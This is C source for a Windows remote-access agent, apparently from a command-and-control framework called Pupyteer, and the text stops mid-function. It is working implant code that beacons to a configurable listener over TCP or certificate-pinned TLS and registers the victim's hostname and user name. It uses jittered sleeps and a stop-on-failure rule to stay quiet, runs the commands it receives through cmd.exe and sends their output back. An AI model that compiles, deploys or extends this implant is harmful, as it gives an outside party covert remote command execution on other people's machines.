/*
 * Pupyteer PE Agent Stub — Windows TCP Beacon
 * ------------------------------------------------
 * MinGW cross-compiled Windows agent that connects back to a
 * Pupyteer TCP listener using the JSON-line protocol.
 *
 * Compile:
 *   x86_64-w64-mingw32-gcc -o agent.exe agent.c -lws2_32
 *
 * Protocol (newline-delimited JSON over TCP):
 *   Agent -> Server:
 *     {"type":"register","auth":"...","hostname":"...","os":"windows",
 *      "arch":"x64","username":"...","agent_version":"..."}
 *     {"type":"checkin","session_id":"...","beacon":"..."}
 *     {"type":"output","session_id":"...","command_id":"...","beacon":"...","output":"..."}
 *   Server -> Agent:
 *     {"type":"registered","session_id":"...","beacon_token":"..."}
 *     {"type":"commands","commands":[{"command_id":"...","command":"..."}]}
 *     {"type":"ack"}
 *     {"type":"error","message":"..."}
 *
 * The two credentials are different and neither is optional on a default
 * listener: "auth" says this payload may become a session at all and is spent
 * once, at register; "beacon" is what the server hands back in answer and says
 * every later message speaks for *that* session rather than one whose id
 * someone read in operator output.
 */

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <security.h>
#include <schannel.h>
#include <wincrypt.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <time.h>
#include <io.h>
#include <math.h>

/* ── build-time configuration (filled by PEBuilder) ── */
#ifndef AGENT_HOST
#define AGENT_HOST "{{HOST}}"
#endif
#ifndef AGENT_PORT
#define AGENT_PORT {{PORT}}
#endif
#ifndef AGENT_SLEEP
#define AGENT_SLEEP {{SLEEP}}
#endif
#ifndef AGENT_JITTER
#define AGENT_JITTER {{JITTER}}
#endif
/* Enrollment secret: what lets this payload become a session at all. It is a
 * claim about which team server built this binary, not about who holds the
 * binary, so treat a recovered artifact as carrying it. */
#ifndef AGENT_AUTH
#define AGENT_AUTH "{{AUTH}}"
#endif
#ifndef AGENT_VERSION
#define AGENT_VERSION "1.0.0"
#endif
/* Callbacks over TLS, trusted by pinning the SHA-256 of the listener's own
 * certificate. A team server is reached by IP with a self-signed certificate, so
 * the system store can neither verify it nor be the thing we verify against, and
 * skipping validation would hand every command and result to whoever is on the
 * path. An empty pin means the build has no certificate to trust, which is
 * refused below rather than quietly downgraded to "accept any". */
#ifndef AGENT_TLS
#define AGENT_TLS {{TLS}}
#endif
#ifndef AGENT_TLS_FINGERPRINT
#define AGENT_TLS_FINGERPRINT "{{TLS_FINGERPRINT}}"
#endif

#define RECV_BUF_SIZE 65536
#define SEND_BUF_SIZE 65536
/* The same ceiling the Python agent clips a command result at, so how much
 * output an operator gets does not depend on which payload they dropped. The
 * buffers a result passes through are sized from the output itself (see
 * send_output), because escaping can turn one byte of that into six. */
#define MAX_CMD_OUTPUT (256 * 1024)
#define BEACON_SIZE 160

static char g_session_id[64] = {0};
static char g_beacon[BEACON_SIZE] = {0};
static char g_hostname[256] = {0};
static char g_username[256] = {0};
static const char *g_agent_version = AGENT_VERSION;

/* Registration was refused for a reason that a retry cannot fix. Beaming at a
 * server that will never enrol this payload is the loudest footprint an agent
 * can produce, so the loop stops instead of sleeping and trying again. */
static int g_fatal = 0;

/* ── helpers ── */

static void get_hostname(void) {
    DWORD sz = sizeof(g_hostname);
    if (!GetComputerNameA(g_hostname, &sz)) {
        strncpy_s(g_hostname, sizeof(g_hostname), "unknown", _TRUNCATE);
    }
}

static void get_username(void) {
    DWORD sz = sizeof(g_username);
    if (!GetUserNameA(g_username, &sz)) {
        strncpy_s(g_username, sizeof(g_username), "unknown", _TRUNCATE);
    }
}

/* Sleep for base_seconds * (1 +/- jitter_pct/100) */
static void jittered_sleep(int base_seconds, int jitter_pct) {
    if (jitter_pct <= 0) {
        Sleep((DWORD)base_seconds * 1000);
        return;
    }
    double delta = (double)base_seconds * (jitter_pct / 100.0);
    double offset = ((double)rand() / RAND_MAX * 2.0 - 1.0) * delta;
    double total = (double)base_seconds + offset;
    if (total < 1.0) total = 1.0;
    Sleep((DWORD)(total * 1000));
}

/* ── transport: raw TCP, or the same socket under TLS ──
 *
 * The protocol frames each message with a newline, so the two paths differ
 * only in where bytes come from and go to. Under TLS there is no framing of
 * our own on top: Schannel *is* the TLS stack, so whatever EncryptMessage
 * hands back is the record to write, and bytes read off the socket are fed to
 * DecryptMessage until it has a whole one.
 */

#define TLS_RECORD_CAP 32768
#define PLAIN_CAP (2 * RECV_BUF_SIZE)

typedef struct {
    CredHandle cred;
    CtxtHandle ctx;
    BOOL have_cred;
    BOOL have_ctx;
    SecPkgContext_StreamSizes sizes;
    BYTE *cipher;          /* records read but not yet decrypted */
    size_t cipher_len;
    size_t cipher_cap;
    char *plain;           /* decrypted bytes the reader has not consumed */
    size_t plain_len;
    size_t plain_off;
} tls_state;

static tls_state g_tls;
static int g_tls_on = 0;

static PSecurityFunctionTableA tls_api(void) {
    static PSecurityFunctionTableA table = NULL;
    if (!table) table = InitSecurityInterfaceA();
    return table;
}

static void tls_report(const char *stage, SECURITY_STATUS st) {
    char detail[160];
    snprintf(detail, sizeof(detail), "tls %s: 0x%08lx\n", stage, (unsigned long)st);
    OutputDebugStringA(detail);
}

static void tls_reset(void) {
    PSecurityFunctionTableA api = tls_api();
    if (g_tls.have_ctx && api) api->DeleteSecurityContext(&g_tls.ctx);
    if (g_tls.have_cred && api) api->FreeCredentialsHandle(&g_tls.cred);
    free(g_tls.cipher);
    free(g_tls.plain);
    memset(&g_tls, 0, sizeof(g_tls));
}

static int raw_send_all(SOCKET s, const char *data, size_t len) {
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, data + sent, (int)(len - sent), 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    return 0;
}

static int cipher_reserve(size_t extra) {
    if (g_tls.cipher_len + extra <= g_tls.cipher_cap) return 0;
    size_t cap = g_tls.cipher_cap ? g_tls.cipher_cap : TLS_RECORD_CAP;
    while (g_tls.cipher_len + extra > cap) cap *= 2;
    BYTE *grown = (BYTE *)realloc(g_tls.cipher, cap);
    if (!grown) return -1;
    g_tls.cipher = grown;
    g_tls.cipher_cap = cap;
    return 0;
}

static int cipher_fill(SOCKET s) {
    if (cipher_reserve(TLS_RECORD_CAP) != 0) return -1;
    int n = recv(s, (char *)g_tls.cipher + g_tls.cipher_len,
                 (int)(g_tls.cipher_cap - g_tls.cipher_len), 0);
    if (n <= 0) return -1;
    g_tls.cipher_len += (size_t)n;
    return 0;
}

/* Drop the bytes the SSPI layer has taken ownership of, keeping whatever a
 * second record already waiting in the same read. */
static void tls_consume_cipher(size_t n) {
    if (n > g_tls.cipher_len) n = g_tls.cipher_len;
    if (n == 0) return;
    memmove(g_tls.cipher, g_tls.cipher + n, g_tls.cipher_len - n);
    g_tls.cipher_len -= n;
}

static void plain_append(const char *data, size_t len) {
    if (!g_tls.plain) {
        g_tls.plain = (char *)malloc(PLAIN_CAP);
        if (!g_tls.plain) return;
    }
    if (g_tls.plain_off + g_tls.plain_len + len > PLAIN_CAP) {
        memmove(g_tls.plain, g_tls.plain + g_tls.plain_off, g_tls.plain_len);
        g_tls.plain_off = 0;
    }
    if (g_tls.plain_off + g_tls.plain_len + len > PLAIN_CAP) {
        /* A line longer than the buffer: dropping it is visible to the
         * operator as a command with no result, which beats handing back half
         * of a file listing that reads like all of one. */
        return;
    }
    memcpy(g_tls.plain + g_tls.plain_off + g_tls.plain_len, data, len);
    g_tls.plain_len += len;
}

/* The pinned value is the SHA-256 of the listener certificate's DER, compared
 * by hand after the handshake: the certificate is self-signed and no trust
 * store on the target has ever heard of it, which is why the handshake runs
 * with manual credential validation. Refusing an empty pin is the point of the
 * exercise; TLS that trusts any certificate is a man in the middle with extra
 * steps, and an agent cannot tell the difference from having none at all. */
static int tls_pin_ok(void) {
    PSecurityFunctionTableA api = tls_api();
    PCERT_CONTEXT cert = NULL;
    BYTE digest[32];
    DWORD digest_len = sizeof(digest);
    char hex[sizeof(digest) * 2 + 1];

    if (AGENT_TLS_FINGERPRINT[0] == '\0') return 0;
    if (!api || api->QueryContextAttributesA(&g_tls.ctx,
                                             SECPKG_ATTR_REMOTE_CERT_CONTEXT,
                                             &cert) != SEC_E_OK || !cert) {
        return 0;
    }
    if (!CryptHashCertificate((HCRYPTPROV_LEGACY)0, CALG_SHA_256, 0, cert->pbCertEncoded,
                              cert->cbCertEncoded, digest, &digest_len)
            || digest_len != sizeof(digest)) {
        CertFreeCertificateContext(cert);
        return 0;
    }
    /* Crypt32 allocated the certificate, so Crypt32 has to release it.
     * FreeContextBuffer is right for the tokens a handshake hands back and
     * wrong here: it LocalFrees a block the SSPI heap never owned, and the
     * corruption only surfaces as some later allocation falling over. */
    CertFreeCertificateContext(cert);
    for (DWORD i = 0; i < digest_len; i++) {
        snprintf(hex + i * 2, 3, "%02x", digest[i]);
    }
    return _stricmp(hex, AGENT_TLS_FINGERPRINT) == 0;
}

static int tls_handshake(SOCKET s) {
    PSecurityFunctionTableA api = tls_api();
    SECURITY_STATUS st;
    TimeStamp ttl;
    unsigned long attrs = 0;
    SecBuffer out[1];
    SecBuffer in[1];
    SecBufferDesc out_desc;
    SecBufferDesc in_desc;
    unsigned long flags = ISC_REQ_CONFIDENTIALITY | ISC_REQ_SEQUENCE_DETECT
                        | ISC_REQ_REPLAY_DETECT | ISC_REQ_MANUAL_CRED_VALIDATION
                        | ISC_REQ_ALLOCATE_MEMORY;

    if (!api) return -1;

    st = api->AcquireCredentialsHandleA(NULL, (char *)UNISP_NAME_A,
                                        SECPKG_CRED_OUTBOUND, NULL, NULL,
                                        NULL, NULL, &g_tls.cred, &ttl);
    if (st != SEC_E_OK) {
        tls_report("acquire credentials", st);
        return -1;
    }
    g_tls.have_cred = TRUE;

    out_desc.ulVersion = SECBUFFER_VERSION;
    out_desc.cBuffers = 1;
    out_desc.pBuffers = out;
    in_desc.ulVersion = SECBUFFER_VERSION;
    in_desc.cBuffers = 1;
    in_desc.pBuffers = in;

    /* The target name is what Schannel would normally match a certificate
     * against. Manual credential validation is set, so the pin below is the
     * verification and this string only has to be the address we dialled. */
    out[0].BufferType = SECBUFFER_TOKEN;
    out[0].pvBuffer = NULL;
    out[0].cbBuffer = 0;
    st = api->InitializeSecurityContextA(&g_tls.cred, NULL, (char *)AGENT_HOST,
                                         flags, 0, SECURITY_NATIVE_DREP,
                                         NULL, 0, &g_tls.ctx, &out_desc,
                                         &attrs, &ttl);
    if (st != SEC_I_CONTINUE_NEEDED && st != SEC_E_OK) {
        tls_report("client hello", st);
        return -1;
    }
    g_tls.have_ctx = TRUE;

    for (;;) {
        int sent = out[0].cbBuffer
                       ? raw_send_all(s, (char *)out[0].pvBuffer, out[0].cbBuffer)
                       : 0;
        api->FreeContextBuffer(out[0].pvBuffer);
        out[0].pvBuffer = NULL;
        out[0].cbBuffer = 0;
        if (sent != 0) return -1;
        if (st == SEC_E_OK) break;

        for (;;) {
            in[0].BufferType = SECBUFFER_TOKEN;
            in[0].pvBuffer = g_tls.cipher;
            in[0].cbBuffer = (unsigned long)g_tls.cipher_len;
            st = api->InitializeSecurityContextA(&g_tls.cred, &g_tls.ctx,
                                                 (char *)AGENT_HOST, flags, 0,
                                                 SECURITY_NATIVE_DREP,
                                                 &in_desc, 0, &g_tls.ctx,
                                                 &out_desc, &attrs, &ttl);
            if (st != SEC_E_INCOMPLETE_MESSAGE) break;
            /* A flight spread over several reads: keep collecting and hand the
             * whole thing over at once, which is what Schannel asked for. */
            if (cipher_fill(s) != 0) return -1;
        }

        if (st != SEC_I_CONTINUE_NEEDED && st != SEC_E_OK) {
            tls_report("handshake", st);
            return -1;
        }
        /* Whatever this call consumed is no longer ours to hand over again, but
         * a second flight may already sit behind it in the same buffer. */
        tls_consume_cipher(in[0].cbBuffer);
    }

    if (api->QueryContextAttributesA(&g_tls.ctx, SECPKG_ATTR_STREAM_SIZES,
                                     &g_tls.sizes) != SEC_E_OK) {
        tls_report("sizes", 0);
        return -1;
    }
    /* Two different answers because they call for different things from an
     * operator: -1 is a handshake that could have gone wrong for a transient
     * reason, so the beacon reconnects; -2 is a listener that is not the one
     * this payload was built for, which no amount of retrying will change. */
    return tls_pin_ok() ? 0 : -2;
}

static int tls_send(SOCKET s, const char *data) {
    PSecurityFunctionTableA api = tls_api();
    SecBufferDesc desc;
    SecBuffer buf[4];
    SECURITY_STATUS st;
    size_t body = strlen(data);
    /* One line, which under TLS means a newline like any other byte: the
     * plaintext path appends it with its own send(), and the framing on the
     * listener side reads nothing until it is there. */
    size_t len = body + 1;
    unsigned long hdr = (unsigned long)g_tls.sizes.cbHeader;
    unsigned long trl = (unsigned long)g_tls.sizes.cbTrailer;
    /* One TLS record carries at most cbMaximumMessage bytes of plaintext, and
     * a command result is routinely larger than that, so a line goes out as
     * however many records it needs. The reader sees one byte stream either
     * way; nothing on the other end has to know a split happened. */
    size_t chunk_max = g_tls.sizes.cbMaximumMessage
                           ? (size_t)g_tls.sizes.cbMaximumMessage : 16384;
    size_t cap = chunk_max + hdr + trl + (size_t)g_tls.sizes.cbBlockSize;
    BYTE *record = (BYTE *)malloc(cap);
    size_t off = 0;

    if (!record) return -1;

    while (off < len) {
        size_t chunk = len - off;
        size_t total;
        size_t copy = chunk;
        if (chunk > chunk_max) chunk = chunk_max;
        if (off + chunk > body) copy = body - off;    /* the rest is the \n */
        memcpy(record + hdr, data + off, copy);
        if (copy < chunk) record[hdr + copy] = '\n';

        /* Header, payload and trailer as three separate buffers rather than one
         * SECBUFFER_STREAM. The stream form is a convenience Schannel cannot
         * offer for the AEAD suites it negotiates now, where the tag covers the
         * header too and so cannot be written into a single flat record; it
         * answers that with SEC_E_INVALID_TOKEN and nothing leaves the socket. */
        buf[0].BufferType = SECBUFFER_STREAM_HEADER;
        buf[0].pvBuffer = record;
        buf[0].cbBuffer = hdr;
        buf[1].BufferType = SECBUFFER_DATA;
        buf[1].pvBuffer = record + hdr;
        buf[1].cbBuffer = (unsigned long)chunk;
        buf[2].BufferType = SECBUFFER_STREAM_TRAILER;
        buf[2].pvBuffer = record + hdr + chunk;
        buf[2].cbBuffer = trl;
        buf[3].BufferType = SECBUFFER_EMPTY;
        buf[3].pvBuffer = NULL;
        buf[3].cbBuffer = 0;
        desc.ulVersion = SECBUFFER_VERSION;
        desc.cBuffers = 4;
        desc.pBuffers = buf;

        st = api->EncryptMessage(&g_tls.ctx, 0, &desc, 0);
        if (st != SEC_E_OK) {
            tls_report("encrypt", st);
            break;
        }
        /* The suite decides how much header and tag it actually used, so the
         * record is as long as the three buffers now report rather than as long
         * as the room that was reserved for them. */
        total = (size_t)buf[0].cbBuffer + buf[1].cbBuffer + buf[2].cbBuffer;
        if (raw_send_all(s, (char *)record, total) != 0) break;
        off += chunk;
    }

    free(record);
    return off == len ? 0 : -1;
}

/* One DecryptMessage pass over whatever is buffered, reading from the socket
 * whenever the buffer does not hold a whole record. Returns 1 when it consumed
 * a record, 0 when nothing came of it, -1 on a failure that ends the socket. */
static int tls_decrypt_once(SOCKET s) {
    PSecurityFunctionTableA api = tls_api();
    SecBuffer buf[4];
    SecBufferDesc desc;
    SECURITY_STATUS st;
    size_t have, extra = 0;
    char *plain = NULL;
    size_t plain_len = 0;
    int i;

    if (!g_tls.cipher_len) {
        if (cipher_fill(s) != 0) return -1;
    }
    have = g_tls.cipher_len;

    /* One buffer in, three empty ones for Schannel to fill: it rewrites this
     * array to say where the plaintext ended up, which is *inside* the record
     * just handed over, and where the next record begins. Asking for a copy in
     * a buffer of our own is not on offer — the same AEAD restriction that
     * decides the shape of tls_send. */
    buf[0].BufferType = SECBUFFER_DATA;
    buf[0].pvBuffer = g_tls.cipher;
    buf[0].cbBuffer = (unsigned long)have;
    for (i = 1; i < 4; i++) {
        buf[i].BufferType = SECBUFFER_EMPTY;
        buf[i].pvBuffer = NULL;
        buf[i].cbBuffer = 0;
    }
    desc.ulVersion = SECBUFFER_VERSION;
    desc.cBuffers = 4;
    desc.pBuffers = buf;

    st = api->DecryptMessage(&g_tls.ctx, &desc, 0, NULL);
    if (st == SEC_E_INCOMPLETE_MESSAGE) {
        /* The buffer holds a prefix of a record and nothing more. Reading here
         * is what keeps the caller from spinning: recv blocks until the socket
         * has more bytes, so every pass either grows the buffer or fails. */
        if (cipher_fill(s) != 0) return -1;
        return 0;
    }
    if (st != SEC_E_OK && st != SEC_I_CONTEXT_EXPIRED) {
        if (st == SEC_I_RENEGOTIATE) {
            /* What DecryptMessage hands back here is a ClientHello to echo, not
             * protocol bytes. Answering it needs a handshake state machine this
             * agent does not have, and treating the token as a line of JSON
             * would corrupt the session instead of revealing it. Reconnecting
             * gets a fresh session either way. */
            tls_report("renegotiation", st);
        } else {
            tls_report("decrypt", st);
        }
        return -1;
    }

    for (i = 0; i < 4; i++) {
        if (buf[i].BufferType == SECBUFFER_DATA && buf[i].cbBuffer) {
            plain = (char *)buf[i].pvBuffer;
            plain_len = buf[i].cbBuffer;
        } else if (buf[i].BufferType == SECBUFFER_EXTRA) {
            extra = buf[i].cbBuffer;
        }
    }

    /* The plaintext points into the same buffer the records are stacked in, so
     * it has to be copied out before the consumed prefix is slid away. */
    if (plain_len) plain_append(plain, plain_len);
    tls_consume_cipher(have - extra);

    if (st == SEC_I_CONTEXT_EXPIRED) return -1;
    return plain_len ? 1 : 0;
}

/* Blocking read of one decrypted line; the same shape as the plaintext path
 * below so no caller has to know which one it is on.
 *
 * A line that does not fit is reported as a failure rather than handed back
 * short. Half a command is not a smaller command: it is a different one, and
 * the only thing the operator would see is a result that does not match what
 * they typed. */
static int tls_readline(SOCKET s, char *buf, int len) {
    int total = 0;
    int overflow = 0;

    for (;;) {
        while (g_tls.plain_off < g_tls.plain_len) {
            char c = g_tls.plain[g_tls.plain_off++];
            if (c == '\n') {
                buf[total] = '\0';
                return overflow ? -1 : total;
            }
            if (c == '\r') continue;
            if (total < len - 1) buf[total++] = c;
            else overflow = 1;
        }
        if (g_tls.plain_off == g_tls.plain_len) {
            g_tls.plain_off = g_tls.plain_len = 0;
        }
        int progress = tls_decrypt_once(s);
        if (progress < 0) return -1;
    }
}

static void close_conn(SOCKET s) {
    /* The SSPI handles belong to this socket, not to the process: keeping a
     * credentials handle across a reconnect is how a beacon ends up talking
     * TLS session-record-number state from a connection that no longer exists. */
    tls_reset();
    closesocket(s);
}

static int agent_send(SOCKET s, const char *data) {
    if (g_tls_on) return tls_send(s, data);

    size_t len = strlen(data);
    size_t sent = 0;
    while (sent < len) {
        int n = send(s, data + sent, (int)(len - sent), 0);
        if (n <= 0) return -1;
        sent += (size_t)n;
    }
    if (send(s, "\n", 1, 0) != 1) return -1;
    return 0;
}

static int agent_readline(SOCKET s, char *buf, int len) {
    if (g_tls_on) return tls_readline(s, buf, len);

    int total = 0;
    int overflow = 0;
    char c;
    for (;;) {
        int n = recv(s, &c, 1, 0);
        if (n <= 0) return -1;
        if (c == '\n') break;
        if (c == '\r') continue;
        if (total < len - 1) buf[total++] = c;
        else overflow = 1;                /* read to the end, then drop it */
    }
    buf[total] = '\0';
    return overflow ? -1 : total;
}

/* ── JSON helpers ── */

static int hex_nibble(char c) {
    if (c >= '0' && c <= '9') return c - '0';
    if (c >= 'a' && c <= 'f') return c - 'a' + 10;
    if (c >= 'A' && c <= 'F') return c - 'A' + 10;
    return -1;
}

/* Four hex digits as a number, or -1 if these are not four hex digits. Reading
 * stops at the first non-digit, so it never walks past the NUL that ends the
 * string it was called on. */
static int hex4(const char *p) {
    int value = 0;
    for (int k = 0; k < 4; k++) {
        int d = hex_nibble(p[k]);
        if (d < 0) return -1;
        value = value * 16 + d;
    }
    return value;
}

static const char *json_get_string(const char *json, const char *key, char *out, size_t out_sz) {
    char pattern[128];
    snprintf(pattern, sizeof(pattern), "\"%s\"", key);
    const char *p = strstr(json, pattern);
    if (!p) { out[0] = '\0'; return NULL; }
    p += strlen(pattern);
    while (*p && (*p == ' ' || *p == '\t' || *p == ':' || *p == ',')) p++;
    if (*p != '"') { out[0] = '\0'; return NULL; }
    p++;
    /* Four bytes of room per step because one escape can write that much UTF-8. */
    size_t i = 0;
    while (*p && *p != '"' && i + 4 < out_sz) {
        if (*p == '\\' && p[1]) {
            p++;
            switch (*p) {
                case 'n': out[i++] = '\n'; break;
                case 'r': out[i++] = '\r'; break;
                case 't': out[i++] = '\t'; break;
                case '"': out[i++] = '"'; break;
                case '\\': out[i++] = '\\'; break;
                case '/': out[i++] = '/'; break;
                case 'u': {
                    /* The listener writes JSON with the default ensure_ascii, so
                     * a command that is not pure ASCII reaches this agent as
                     * \uXXXX. Turning it back into the bytes cmd.exe expects is
                     * what lets an operator type the file name they meant on a
                     * host that is not on an English code page; leaving it would
                     * run a command called "u5de5u5177" instead. */
                    int cp = hex4(p + 1);
                    if (cp >= 0xD800 && cp <= 0xDBFF && p[5] == '\\' && p[6] == 'u') {
                        int low = hex4(p + 7);
                        if (low >= 0xDC00 && low <= 0xDFFF) {
                            cp = 0x10000 + ((cp - 0xD800) << 10) + (low - 0xDC00);
                            p += 6;               /* the pair's second escape */
                        }
                    }
                    if (cp < 0 || (cp >= 0xD800 && cp <= 0xDFFF)) {
                        out[i++] = '?';           /* not a character: one honest byte */
                    } else if (cp < 0x80) {
                        out[i++] = (char)cp;
                    } else if (cp < 0x800) {
                        out[i++] = (char)(0xC0 | (cp >> 6));
                        out[i++] = (char)(0x80 | (cp & 0x3F));
                    } else if (cp < 0x10000) {
                        out[i++] = (char)(0xE0 | (cp >> 12));
                        out[i++] = (char)(0x80 | ((cp >> 6) & 0x3F));
                        out[i++] = (char)(0x80 | (cp & 0x3F));
                    } else {
                        out[i++] = (char)(0xF0 | (cp >> 18));
                        out[i++] = (char)(0x80 | ((cp >> 12) & 0x3F));
                        out[i++] = (char)(0x80 | ((cp >> 6) & 0x3F));
                        out[i++] = (char)(0x80 | (cp & 0x3F));
                    }
                    p += 4;
                    break;
                }
                default: out[i++] = *p; break;
            }
        } else {
            out[i++] = *p;
        }
        p++;
    }
    out[i] = '\0';
    return out;
}

/* One source byte becomes at most six output bytes: a control character is
 * written as \u00XX. The listener parses these lines with a strict JSON reader,
 * which rejects a bare byte below 0x20 inside a string — so the old habit of
 * passing such a byte through did not make the result ugly, it made the whole
 * message unparsable and lost the command's output. Escaping is what the Python
 * agent's json.dumps already does.
 *
 * It is given a length rather than a C string because command output is
 * whatever a program wrote: a captured NUL is one character of that output, not
 * the end of it. */
static void json_escape(const char *src, size_t src_len, char *dst, size_t dst_sz) {
    size_t j = 0;
    if (dst_sz < 7) { dst[0] = '\0'; return; }
    for (size_t i = 0; i < src_len && j + 6 < dst_sz; i++) {
        unsigned char c = (unsigned char)src[i];
        switch (c) {
            case '"':  dst[j++] = '\\'; dst[j++] = '"'; break;
            case '\\': dst[j++] = '\\'; dst[j++] = '\\'; break;
            case '\n': dst[j++] = '\\'; dst[j++] = 'n'; break;
            case '\r': dst[j++] = '\\'; dst[j++] = 'r'; break;
            case '\t': dst[j++] = '\\'; dst[j++] = 't'; break;
            default:
                if (c < 0x20) {
                    snprintf(dst + j, 7, "\\u%04x", c);
                    j += 6;
                } else {
                    dst[j++] = (char)c;
                }
                break;
        }
    }
    dst[j] = '\0';
}

/* The room a JSON string of this much text can need, plus the NUL. Callers size
 * an escape buffer with this and the message off the result, so escaping never
 * has to drop what it ran out of — which is also what keeps a multi-byte UTF-8
 * sequence from being cut in half. */
#define JSON_ESCAPED_MAX(n) ((size_t)(n) * 6 + 1)

/* ── command execution ── */

static void exec_command(const char *cmd, char *out, size_t out_sz, size_t *out_len) {
    char tmpfile[MAX_PATH];
    char cmdline[4096];
    DWORD tick = GetTickCount();
    snprintf(tmpfile, MAX_PATH, "%s\\pupyteer_tmp_%lu.txt",
             getenv("TEMP") ? getenv("TEMP") : "C:\\Windows\\Temp", tick);
    snprintf(cmdline, sizeof(cmdline), "cmd.exe /c \"%s\" > \"%s\" 2>&1", cmd, tmpfile);

    int rc = system(cmdline);

    FILE *f = NULL;
    *out_len = 0;
    fopen_s(&f, tmpfile, "r");
    if (f) {
        size_t want = out_sz - 1;
        /* A single fread is allowed to return less than asked for and still have
         * the file holding more, so keep filling until either runs out. */
        while (*out_len < want) {
            size_t n = fread(out + *out_len, 1, want - *out_len, f);
            if (n == 0) break;
            *out_len += n;
        }
        fclose(f);
        DeleteFileA(tmpfile);
    } else {
        snprintf(out, out_sz, "command executed (rc=%d), output capture unavailable", rc);
        *out_len = strlen(out);
    }
    out[*out_len] = '\0';
}

/* ── protocol handlers ── */

static int handle_register(SOCKET s) {
    char escaped_auth[BEACON_SIZE], escaped_host[512], escaped_user[512];
    char msg[SEND_BUF_SIZE];
    json_escape(AGENT_AUTH, strlen(AGENT_AUTH), escaped_auth, sizeof(escaped_auth));
    json_escape(g_hostname, strlen(g_hostname), escaped_host, sizeof(escaped_host));
    json_escape(g_username, strlen(g_username), escaped_user, sizeof(escaped_user));
    snprintf(msg, sizeof(msg),
             "{\"type\":\"register\",\"auth\":\"%s\",\"hostname\":\"%s\","
             "\"os\":\"windows\",\"arch\":\"x64\",\"username\":\"%s\","
             "\"agent_version\":\"%s\"}",
             escaped_auth, escaped_host, escaped_user, g_agent_version);
    return agent_send(s, msg);
}

/* What a program printed is in the host's own code page; what JSON has to carry
 * is UTF-8. This is not a cosmetic mismatch: a byte that is not part of a valid
 * UTF-8 sequence does not arrive as one odd character, it makes the whole line
 * undecodable and the command's result never appears. A host whose output is
 * ASCII is unaffected; a Chinese, Russian or Greek desktop is not.
 *
 * The tiers are ordered by how much they keep: strict conversion, then the same
 * conversion letting Windows substitute for the bytes it cannot read, then a
 * pass that keeps the ASCII and marks the rest. The last one loses text, and it
 * exists so the loss is on that result's tail rather than on the message. */
static char *utf8_from_oem(const char *bytes, size_t len, size_t *out_len) {
    UINT flags = MB_ERR_INVALID_CHARS;
    int wn = MultiByteToWideChar(CP_OEMCP, flags, bytes, (int)len, NULL, 0);
    if (wn <= 0) {
        wn = MultiByteToWideChar(CP_OEMCP, 0, bytes, (int)len, NULL, 0);
        flags = 0;
    }
    WCHAR *wide = wn > 0 ? (WCHAR *)malloc((size_t)wn * sizeof(WCHAR)) : NULL;
    char *utf8 = NULL;
    *out_len = 0;

    if (wide && MultiByteToWideChar(CP_OEMCP, flags, bytes, (int)len, wide, wn) == wn) {
        int cn = WideCharToMultiByte(CP_UTF8, 0, wide, wn, NULL, 0, NULL, NULL);
        if (cn > 0) {
            utf8 = (char *)malloc((size_t)cn + 1);
            if (utf8 && WideCharToMultiByte(CP_UTF8, 0, wide, wn, utf8, cn, NULL, NULL) == cn) {
                utf8[cn] = '\0';
                *out_len = (size_t)cn;
            } else {
                free(utf8);
                utf8 = NULL;
            }
        }
    }
    free(wide);

    if (!utf8) {
        utf8 = (char *)malloc(len + 1);
        if (!utf8) return NULL;
        size_t j = 0;
        for (size_t i = 0; i < len; i++)
            utf8[j++] = (unsigned char)bytes[i] < 0x80 ? bytes[i] : '?';
        utf8[j] = '\0';
        *out_len = j;
    }
    return utf8;
}

/* Run one command and report what it printed.
 *
 * Every buffer here is sized from the data it has to hold rather than from a
 * ceiling the data has to fit inside: escaping can turn one byte of output into
 * six, and a result that runs out of buffer is a result that arrives with its
 * tail missing and no indication that anything was dropped. */
static int send_output(SOCKET s, const char *cmd, const char *cmd_id) {
    char *raw = (char *)malloc(MAX_CMD_OUTPUT);
    if (!raw) return -1;
    size_t raw_len = 0;
    exec_command(cmd, raw, MAX_CMD_OUTPUT, &raw_len);

    size_t text_len = 0;
    char *text = utf8_from_oem(raw, raw_len, &text_len);
    free(raw);
    if (!text) return -1;

    size_t esc_sz = JSON_ESCAPED_MAX(text_len);
    char *escaped = (char *)malloc(esc_sz);
    char *msg = NULL;
    int rc = -1;
    if (escaped) {
        json_escape(text, text_len, escaped, esc_sz);
        /* The framing text plus the three identifiers it carries. */
        msg = (char *)malloc(esc_sz + 1024);
    }
    free(text);

    if (msg) {
        snprintf(msg, esc_sz + 1024,
                 "{\"type\":\"output\",\"session_id\":\"%s\","
                 "\"command_id\":\"%s\",\"beacon\":\"%s\",\"output\":\"%s\"}",
                 g_session_id, cmd_id, g_beacon, escaped);
        rc = agent_send(s, msg);
    }
    free(escaped);
    free(msg);
    return rc;
}

static int handle_server_msg(SOCKET s, const char *line) {
    char msg_type[32] = {0};
    json_get_string(line, "type", msg_type, sizeof(msg_type));

    if (strcmp(msg_type, "registered") == 0) {
        char sid[64] = {0};
        char beacon[BEACON_SIZE] = {0};
        json_get_string(line, "session_id", sid, sizeof(sid));
        json_get_string(line, "beacon_token", beacon, sizeof(beacon));
        if (!sid[0] || !beacon[0]) {
            /* A server that answers registration without a token is one this
             * agent cannot beacon against: every checkin would be refused, and
             * the operator would see a session that reappears and never takes a
             * command. Say so once rather than pretend to be alive. */
            g_fatal = 1;
            return -1;
        }
        strncpy_s(g_session_id, sizeof(g_session_id), sid, _TRUNCATE);
        strncpy_s(g_beacon, sizeof(g_beacon), beacon, _TRUNCATE);
        return 0;
    }

    if (strcmp(msg_type, "ack") == 0) return 0;

    if (strcmp(msg_type, "error") == 0) {
        char why[64] = {0};
        json_get_string(line, "message", why, sizeof(why));
        if (strcmp(why, "auth_failed") == 0 || strcmp(why, "unknown_session") == 0) {
            /* auth_failed: built by a server that is not this one.
             * unknown_session: the server has forgotten us, and re-registering
             * from the top of main() is the way back. */
            g_fatal = (strcmp(why, "auth_failed") == 0);
        }
        return -1;
    }

    if (strcmp(msg_type, "commands") == 0) {
        const char *arr_start = strstr(line, "\"commands\"");
        if (!arr_start) return 0;
        arr_start = strchr(arr_start, '[');
        if (!arr_start) return 0;

        const char *p = arr_start + 1;
        while (*p) {
            while (*p && *p != '{') {
                if (*p == ']') return 0;
                p++;
            }
            if (!*p) break;
